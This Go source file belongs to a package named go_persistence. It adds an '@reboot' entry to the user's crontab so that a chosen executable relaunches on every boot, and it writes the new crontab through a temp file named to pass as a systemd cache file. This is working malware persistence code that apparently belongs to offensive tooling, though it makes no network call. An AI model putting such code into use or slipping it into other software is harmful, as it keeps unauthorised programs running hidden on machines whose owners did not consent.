package go_persistence

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

func Crontab(exePath string) bool /* success */ {
	curCronConf, err := getCurCronConf()

	// If crontab empty it return exit code 1
	if err != nil {
		if exiterr, ok := err.(*exec.ExitError); ok {
		 	if exitCode := exiterr.ExitCode(); exitCode != 1 {
				return false
			}
		} else {
			return false
		}
	}

	cronJob := getCronJob(exePath)

	if checkIsUse(curCronConf, cronJob) {
		return true
	}

	confFile, err := saveNewConf(curCronConf, cronJob)

	if err != nil {
		return false
	}
	defer os.Remove(confFile.Name())

	_, err = exec.Command("crontab", confFile.Name()).Output()

	return err == nil
}

func getCronJob(exePath string) string {
	return fmt.Sprintf("@reboot %s", exePath)
}

func getCurCronConf() (string, error) {
	currentCronConf, err := exec.Command("crontab", "-l").Output()

	if err != nil {
		return "", err
	}
	return string(currentCronConf), nil
}

func saveNewConf(curConf, newJob string) (*os.File, error) {
	file, err := ioutil.TempFile("", "systemd-cache-conf-")

	if err != nil {
		return nil, err
	}
	newCronConf := fmt.Sprintf("%s%s\n", curConf, newJob)
	err = ioutil.WriteFile(file.Name(), []byte(newCronConf), 0644)

	if err != nil {
		return nil, err
	}
	return file, nil
}

func checkIsUse(curCronConf, cronJob string) bool {
	return strings.Contains(curCronConf, cronJob)
}